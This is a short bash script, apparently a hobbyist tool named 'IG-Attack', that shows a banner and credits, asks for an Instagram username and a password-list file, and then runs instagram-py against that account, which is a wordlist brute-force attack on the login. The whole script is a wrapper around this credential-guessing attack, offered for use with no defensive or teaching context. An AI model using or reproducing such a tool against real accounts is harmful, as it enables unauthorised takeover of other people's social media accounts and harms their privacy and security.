#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
   __________      ___   __  __             __  
   /  _/ ____/     /   | / /_/ /_____ ______/ /__
   / // / ________/ /| |/ __/ __/ __ `/ ___/ //_/
 _/ // /_/ /_____/ ___ / /_/ /_/ /_/ / /__/ ,<   
/___/\____/     /_/  |_\__/\__/\__,_/\___/_/|_|  
                  
o--o       
|   |      
O--o  o  o 
|   | |  | 
o--o  o--O 
         | 
      o--o        _/_/_/_/_/  _/_/_/_/_/  _/      _/   
                     _/          _/        _/  _/      
                    _/          _/          _/         
                   _/          _/        _/  _/        
                  _/          _/      _/      _/
                                                 
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Coded By Tetrodotoxin 2.0 << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  Instagram : \e[1;96m @Tetrodotoxin2.0 \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo 
read -p "[#] User Name : " usrnm
echo
read -p "[#] Enter Passlist Location : " inspass
echo
if [ $inspass = 0 ]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
sleep 30.0
cd $HOME
fi
sleep 30.0
cd $HOME/IG-Attack
bash ig-attack.sh
